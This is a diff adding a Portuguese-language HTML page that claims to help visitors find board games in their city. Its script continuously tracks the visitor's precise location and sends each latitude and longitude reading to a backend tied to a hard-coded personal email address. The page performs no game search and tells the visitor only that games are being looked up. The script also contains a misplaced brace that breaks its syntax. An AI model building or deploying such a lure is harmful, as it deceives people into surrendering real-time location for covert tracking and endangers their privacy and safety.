@@ -1,0 +1,89 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Localização de Jogos de Tabuleiro</title>
+    <script>
+        let watchId;
+
+        function obterLocalizacao() {
+            if (navigator.geolocation) {
+                // Se já houver um acompanhamento ativo, pare-o antes de iniciar um novo
+                if (watchId) {
+                    navigator.geolocation.clearWatch(watchId);
+                    console.log("Acompanhamento anterior cancelado.");
+                }
+
+                // Inicia o acompanhamento da localização em tempo real
+                watchId = navigator.geolocation.watchPosition(enviarLocalizacao, tratarErro, {
+                    enableHighAccuracy: true,  // Tentativa de obter a localização com alta precisão
+                    timeout: 60000,  // Tempo máximo para obter a localização (60 segundos)
+                    maximumAge: 0  // Não usar a localização cacheada
+                });
+            } else {
+                alert("Geolocalização não é suportada por este navegador.");
+            }
+        }
+
+        function enviarLocalizacao(position) {
+            const lat = position.coords.latitude;
+            const lng = position.coords.longitude;
+
+            // Enviar a localização para o seu e-mail
+            fetch('https://seu-backend.com/enviar-email', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({
+                    email: 'adriacarvalho187@gmail.com',  // Seu e-mail para o qual os dados serão enviados
+                    latitude: lat,
+                    longitude: lng
+                }),
+            })
+            .then(response => response.json())
+            .then(data => {
+    alert("Localização concedida. Buscando jogos na sua região...");
+})
+                console.log("Localização enviada com sucesso! Latitude: " + lat + ", Longitude: " + lng);
+            })
+            .catch((error) => {
+                console.error('Erro ao enviar a localização:', error);
+            });
+        }
+
+        function tratarErro(error) {
+            switch(error.code) {
+                case error.PERMISSION_DENIED:
+                    alert("Usuário negou a solicitação de Geolocalização.");
+                    break;
+                case error.POSITION_UNAVAILABLE:
+                    alert("Localização indisponível.");
+                    break;
+                case error.TIMEOUT:
+                    alert("A solicitação de localização expirou.");
+                    break;
+                case error.UNKNOWN_ERROR:
+                    alert("Um erro desconhecido ocorreu.");
+                    break;
+            }
+        }
+
+        // Para parar o acompanhamento da localização, se necessário
+        function pararAcompanhamento() {
+            if (watchId) {
+                navigator.geolocation.clearWatch(watchId);
+                alert("Acompanhamento de localização interrompido.");
+            }
+        }
+    </script>
+</head>
+<body>
+    <h1>Encontre Jogos de Tabuleiro na Sua Cidade</h1>
+    <p>Clique no botão abaixo para obter informações sobre locais com jogos de tabuleiro em sua cidade e permitir o acompanhamento da sua localização em tempo real.</p>
+    <button onclick="obterLocalizacao()">Clique aqui para permitir localização e encontrar jogos</button>
+    <br>
+    <button onclick="pararAcompanhamento()">Parar Acompanhamento</button>
+</body>
+</html>
